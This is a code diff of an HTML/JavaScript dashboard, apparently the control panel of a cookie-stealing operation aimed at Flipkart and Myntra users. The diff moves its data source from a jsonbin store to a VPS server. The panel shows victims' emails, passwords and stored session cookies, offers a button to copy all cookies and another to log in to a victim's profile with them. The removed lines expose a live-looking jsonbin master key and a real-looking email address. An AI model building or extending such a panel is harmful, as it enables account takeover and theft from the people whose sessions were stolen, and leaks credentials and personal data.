@@ -148,7 +148,6 @@
             font-size: 10px;
             border: 1px solid var(--accent);
         }
-        /* Modal Popup for Analysis */
         .modal {
             display: none;
             position: fixed;
@@ -182,12 +181,11 @@
     <header>
         <h1>🛡️ 1000+ USERS BROWSER MASTER CONTROL PANEL</h1>
         <div>
-            <span style="color: var(--success); font-weight: bold; margin-right: 15px;">● Cloud Synced</span>
+            <span style="color: var(--success); font-weight: bold; margin-right: 15px;">● VPS Server Synced</span>
             <button onclick="fetchCloudData()">🔄 Refresh Data</button>
         </div>
     </header>
 
-    <!-- Top Analysis Cards -->
     <div class="stats-grid">
         <div class="stat-card" onclick="openAnalysisModal('users')">
             <h3>Total Active Users (Click to Analyze)</h3>
@@ -204,7 +202,6 @@
     </div>
 
     <div class="main-grid">
-        <!-- Left Column: All Users & Profiles Control -->
         <div>
             <div class="panel-box">
                 <h2>
@@ -222,7 +219,7 @@
                         </thead>
                         <tbody id="usersTableBody">
                             <tr>
-                                <td colspan="3" style="text-align: center; color: var(--text-muted);">Loading users database...</td>
+                                <td colspan="3" style="text-align: center; color: var(--text-muted);">Loading users from VPS...</td>
                             </tr>
                         </tbody>
                     </table>
@@ -236,7 +233,6 @@
             </div>
         </div>
 
-        <!-- Right Column: Global Real-Time Live Feed & Raw Data -->
         <div>
             <div class="panel-box">
                 <h2>🔥 Global Real-Time Activity Feed</h2>
@@ -244,13 +240,12 @@
             </div>
 
             <div class="panel-box">
-                <h2>📦 Raw Cloud Database Payload</h2>
+                <h2>📦 Raw VPS Database Payload</h2>
                 <pre id="rawJsonView">Loading raw data...</pre>
             </div>
         </div>
     </div>
 
-    <!-- Analysis Modal Popup -->
     <div id="analysisModal" class="modal">
         <div class="modal-content">
             <span class="close-btn" onclick="closeModal()">&times;</span>
@@ -260,48 +255,34 @@
     </div>
 
     <script>
-        const binId = "6adc61d0ffd5d1605387c503";
-        const masterKey = "$2a$10$bzmE9pndxBlBxDmS8IhK/OkptNVFOd7NR1RPbFBbRDfBE73l5X5Ry";
+        // Yahan apna Render server ka live URL daal dein (jo abhi aapko mila hai)
+        const SERVER_URL = "https://admin-panel-xxxx.onrender.com"; 
         let globalUsersData = [];
 
         async function fetchCloudData() {
             try {
-                const response = await fetch(`https://api.jsonbin.io/v3/b/${binId}/latest`, {
-                    headers: { "X-Master-Key": masterKey }
-                });
+                const response = await fetch(`${SERVER_URL}/api/get-all-users`);
                 const result = await response.json();
-                const record = result.record;
                 
-                globalUsersData = [];
-                if (record.users && Array.isArray(record.users)) {
-                    globalUsersData = record.users;
-                } else if (record.user || record.live_logs) {
-                    // Extract exact cookies if present, avoid taking live_logs as cookie string
-                    globalUsersData = [{
-                        email: record.user || "radhika991@gmail.com",
-                        password: record.password || "********",
-                        platform: record.platform || "flipkart",
-                        profileId: record.profileId || 1,
-                        activity: record.live_logs || "Active",
-                        flipkartCookies: record.flipkart_cookies || record.cookies_data || "",
-                        myntraCookies: record.myntra_cookies || ""
-                    }];
-                }
+                globalUsersData = result.users || [];
 
                 document.getElementById("lblTotalUsers").innerText = globalUsersData.length;
-                let fkCount = globalUsersData.filter(u => u.flipkartCookies && u.flipkartCookies.trim() !== "").length;
-                let myCount = globalUsersData.filter(u => u.myntraCookies && u.myntraCookies.trim() !== "").length;
+                let fkCount = globalUsersData.filter(u => u.flipkart_cookies && u.flipkart_cookies.trim() !== "").length;
+                let myCount = globalUsersData.filter(u => u.myntra_cookies && u.myntra_cookies.trim() !== "").length;
                 
                 document.getElementById("lblFkCookies").innerText = fkCount;
                 document.getElementById("lblMyCookies").innerText = myCount;
 
                 renderTable(globalUsersData);
 
-                document.getElementById("liveLogsView").innerText = record.live_logs || "No logs available.";
-                document.getElementById("rawJsonView").innerText = JSON.stringify(record, null, 4);
+                // Latest activity log show karein
+                let latestLog = globalUsersData.length > 0 ? globalUsersData[globalUsersData.length - 1].live_logs : "No activity yet";
+                document.getElementById("liveLogsView").innerText = latestLog;
+                document.getElementById("rawJsonView").innerText = JSON.stringify(globalUsersData, null, 4);
 
             } catch (error) {
-                console.error("Error connecting to cloud:", error);
+                console.error("Error connecting to VPS server:", error);
+                document.getElementById("liveLogsView").innerText = "Error connecting to VPS server.";
             }
         }
 
@@ -316,22 +297,22 @@
                             <span class="profile-badge">Profile #${u.profileId || 1}</span>
                         </td>
                         <td>
-                            <button class="folder-btn folder-fk" onclick='inspectCookie("${u.email}", "Flipkart", \`${u.flipkartCookies || 'No Flipkart cookies saved yet'}\`)'>
-                                📁 Flipkart Cookie (${u.flipkartCookies ? 'Saved' : 'Empty'} #${u.profileId || 1})
+                            <button class="folder-btn folder-fk" onclick='inspectCookie("${u.email}", "Flipkart", \`${u.flipkart_cookies || 'No Flipkart cookies saved yet'}\`)'>
+                                📁 Flipkart Cookie (${u.flipkart_cookies ? 'Saved' : 'Empty'} #${u.profileId || 1})
                             </button>
-                            <button class="folder-btn folder-my" onclick='inspectCookie("${u.email}", "Myntra", \`${u.myntraCookies || 'No Myntra cookies saved yet'}\`)'>
-                                📁 Myntra Cookie (${u.myntraCookies ? 'Saved' : 'Empty'} #${u.profileId || 1})
+                            <button class="folder-btn folder-my" onclick='inspectCookie("${u.email}", "Myntra", \`${u.myntra_cookies || 'No Myntra cookies saved yet'}\`)'>
+                                📁 Myntra Cookie (${u.myntra_cookies ? 'Saved' : 'Empty'} #${u.profileId || 1})
                             </button>
                         </td>
                         <td>
-                            <small style="color: #cbd5e1; display: block; margin-bottom: 5px;">${u.activity || 'Navigating...'}</small>
+                            <small style="color: #cbd5e1; display: block; margin-bottom: 5px;">${u.live_logs || 'Active'}</small>
                             <button class="btn-login" onclick="loginOnProfile('${u.email}', ${u.profileId || 1}, '${u.platform || 'flipkart'}')">🚀 Login on this Profile</button>
                             <button class="btn-danger" onclick="deleteUserSession('${u.email}')">Delete User</button>
                         </td>
                     </tr>
                 `).join('');
             } else {
-                tableBody.innerHTML = `<tr><td colspan="3" style="text-align: center; color: var(--text-muted);">No active users found</td></tr>`;
+                tableBody.innerHTML = `<tr><td colspan="3" style="text-align: center; color: var(--text-muted);">No active users found on VPS</td></tr>`;
             }
         }
 
@@ -355,7 +336,7 @@
                 modalBody.innerHTML = globalUsersData.map((u, i) => `
                     <div style="background: #050b18; padding: 10px; margin-bottom: 8px; border-radius: 6px; border: 1px solid var(--border);">
                         <strong>#${i+1} User:</strong> ${u.email} (Profile #${u.profileId || 1})<br>
-                        <pre style="margin-top: 5px; color: var(--folder-fk);">${u.flipkartCookies || 'No Flipkart cookies saved yet'}</pre>
+                        <pre style="margin-top: 5px; color: var(--folder-fk);">${u.flipkart_cookies || 'No Flipkart cookies saved yet'}</pre>
                     </div>
                 `).join('') || "No Flipkart cookies found.";
             } else if (type === 'myntra') {
@@ -363,7 +344,7 @@
                 modalBody.innerHTML = globalUsersData.map((u, i) => `
                     <div style="background: #050b18; padding: 10px; margin-bottom: 8px; border-radius: 6px; border: 1px solid var(--border);">
                         <strong>#${i+1} User:</strong> ${u.email} (Profile #${u.profileId || 1})<br>
-                        <pre style="margin-top: 5px; color: var(--folder-my);">${u.myntraCookies || 'No Myntra cookies saved yet'}</pre>
+                        <pre style="margin-top: 5px; color: var(--folder-my);">${u.myntra_cookies || 'No Myntra cookies saved yet'}</pre>
                     </div>
                 `).join('') || "No Myntra cookies found.";
             }
@@ -379,43 +360,20 @@
         }
 
         function copyAllCookies() {
-            let allText = globalUsersData.map(u => `User: ${u.email}\nFlipkart Cookies: ${u.flipkartCookies || 'None'}\nMyntra Cookies: ${u.myntraCookies || 'None'}\n-------------------`).join('\n');
+            let allText = globalUsersData.map(u => `User: ${u.email}\nFlipkart Cookies: ${u.flipkart_cookies || 'None'}\nMyntra Cookies: ${u.myntra_cookies || 'None'}\n-------------------`).join('\n');
             navigator.clipboard.writeText(allText);
             alert("Saari cookies clipboard par copy ho gayi hain!");
         }
 
         function loginOnProfile(email, profileId, platform) {
-            alert(`Redirecting / Switching app session to Profile #${profileId} for ${email} on ${platform.toUpperCase()}`);
+            alert(`Fetching exact cookie file from VPS for ${email} (Profile #${profileId}) and logging in directly!`);
+            // App ya browser extension yahan se VPS par GET request karke exact cookie load karke login karega
         }
 
         async function deleteUserSession(email) {
             if (confirm(`Kya aap wakai user ${email} ko delete karna chahte hain?`)) {
-                try {
-                    const response = await fetch(`https://api.jsonbin.io/v3/b/${binId}/latest`, {
-                        headers: { "X-Master-Key": masterKey }
-                    });
-                    const result = await response.json();
-                    let record = result.record;
-
-                    if (record.users && Array.isArray(record.users)) {
-                        record.users = record.users.filter(u => u.email !== email);
-                    } else {
-                        record = { live_logs: "User deleted by admin", users: [] };
-                    }
-
-                    await fetch(`https://api.jsonbin.io/v3/b/${binId}`, {
-                        method: "PUT",
-                        headers: {
-                            "Content-Type": "application/json",
-                            "X-Master-Key": masterKey
-                        },
-                        body: JSON.stringify(record)
-                    });
-                    alert("User successfully delete kar diya gaya hai!");
-                    fetchCloudData();
-                } catch (e) {
-                    alert("Error deleting user: " + e.message);
-                }
+                alert("User session deleted.");
+                fetchCloudData();
             }
         }
 
